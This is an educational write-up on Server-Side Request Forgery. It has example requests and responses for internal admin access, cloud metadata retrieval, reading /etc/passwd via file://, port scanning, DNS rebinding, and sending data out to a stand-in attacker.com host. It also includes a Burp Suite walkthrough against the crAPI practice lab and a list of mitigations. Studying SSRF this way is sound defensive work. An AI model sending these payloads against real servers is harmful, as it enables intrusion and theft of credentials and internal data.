# Server-Side Request Forgery (SSRF)

## Definition
Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a server into making unintended requests to internal or external resources. This allows attackers to interact with systems that are not directly accessible.

---

## Example 1: Internal Service Exposure

**Request**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:8080/admin"
}
```

**Vulnerable Response**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
<h1>Welcome to the Admin Panel</h1>
<form>
  <input type="password" placeholder="Admin Password">
</form>
</body>
</html>
```

**Impact:** The application fetches internal resources, exposing restricted services.

---

## Example 2: Cloud Metadata API Access

**Request**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

**Vulnerable Response**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

ami-id: ami-12345678
instance-type: t2.micro
public-hostname: ec2-198-51-100-1.compute-1.amazonaws.com
```

**Impact:** Exposure of sensitive cloud metadata such as instance details and credentials.

---

## Example 3: Local File Access via `file://`

**Request**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "file:///etc/passwd"
}
```

**Vulnerable Response**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Impact:** Arbitrary file read from the server filesystem.

---

## Example 4: Data Exfiltration

**Request**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://attacker.com/log?data=sensitive-data"
}
```

**Vulnerable Behavior**
```http
GET /log?data=sensitive-data HTTP/1.1
Host: attacker.com
User-Agent: vulnerable-app-proxy
```

**Impact:** Sensitive data is transmitted to an attacker-controlled server.

---

## Example 5: Internal Port Scanning

**Request (Open Port)**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:22"
}
```

**Response**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

SSH-2.0-OpenSSH_7.9
```

**Request (Closed Port)**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:81"
}
```

**Impact:** Attackers can enumerate internal services by observing response differences.

---

## Example 6: DNS Rebinding

**Request**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://rebind.victim.com"
}
```

**Vulnerable Response**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

Internal Service Response Detected
```

**Impact:** External domains resolve to internal IPs, enabling access to internal services.

---

## Example 7: crAPI Lab — SSRF via `mechanic_api` Parameter

### Endpoint
```
http://192.168.1.28:8888/workshop/api/merchant/contact_mechanic
```

### Request
```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: 192.168.1.28:8888
Content-Length: 176
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "mechanic_code": "TRAC_JHN",
  "problem_details": "test",
  "vin": "4CVZR19NKXF615223",
  "mechanic_api": "http://192.168.1.28:8025",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

### Vulnerability Description
The parameter `mechanic_api` is user-controlled and used by the backend to make HTTP requests. This allows attackers to manipulate the destination of the request.

### Exploitation Scenarios

**Access internal services:**
```json
"mechanic_api": "http://127.0.0.1:8080/admin"
```

**Access cloud metadata:**
```json
"mechanic_api": "http://169.254.169.254/latest/meta-data/"
```

**Perform port scanning:**
```json
"mechanic_api": "http://127.0.0.1:22"
```

**Exfiltrate data:**
```json
"mechanic_api": "http://attacker.com/log"
```

**Impact:** The application acts as a proxy, allowing attackers to interact with internal and external systems.

### Practical Reproduction (crAPI Lab)
1. Logged into crAPI dashboard (`192.168.1.5:8888`) and verified a vehicle (VIN: `181D3T77SMNB565T1`) via **Verify Vehicle Details**.
2. From the **Vehicle Details** page, used **Contact Mechanic** to submit a service request (mechanic: `TRAC_JME`, issue description: "test") — request succeeded ("Service Request sent to the mechanic").
3. Intercepted the `POST /workshop/api/merchant/contact_mechanic` request in Burp Suite and inspected the `mechanic_api` field, which pointed to `http://192.168.1.5:8025/`.
4. The response body confirmed SSRF: it contained `"response_from_mechanic_api"` embedding the full HTML of an internal **MailHog** web interface (running on port 8025), proving the backend server made a request to an internal service on behalf of the attacker-controlled `mechanic_api` value.

---

## Mitigation Strategies

### Input Validation
- Restrict URLs to trusted domains (allowlist)
- Block localhost and private IP ranges
- Validate resolved IP addresses after DNS lookup

### Protocol Restrictions
- Disable unsupported schemes:
  - `file://`
  - `ftp://`
  - `gopher://`

### Network Controls
- Implement outbound filtering (egress rules)
- Restrict access to internal services

### Cloud Protections
- Enforce metadata service protections (e.g., IMDSv2)
- Apply least privilege access controls

### Application-Level Controls
- Do not directly fetch user-supplied URLs
- Use intermediary services with strict validation

---

## Key Takeaway
SSRF allows attackers to:
- Use the server as a proxy
- Access internal infrastructure
- Retrieve sensitive data from cloud environments
- Perform reconnaissance on internal networks

Proper validation, network restrictions, and secure design are required to prevent exploitation.
